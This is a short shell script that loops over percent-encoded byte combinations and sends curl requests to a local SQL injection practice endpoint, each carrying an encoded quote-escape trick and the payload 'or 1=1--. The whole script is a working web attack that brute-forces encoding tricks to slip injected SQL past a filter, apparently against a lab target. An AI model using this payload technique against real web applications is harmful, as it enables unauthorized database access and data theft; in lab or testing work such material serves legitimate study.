
for f in "3" "4" "5" "6" "7" "8" "9"
do
    for g in "8" "9" "A" "B" "C" "D" "E" "F"
    do
        for h in "1" "2" "3"
        do
            for i in "8" "9" "A"
            do
                for j in "2" "7"
                do
                    curl http://localhost/sqli/6?id=%C$f%$g$h%$i$j%27or%201%3D1--
                done
            done
        done
    done
done
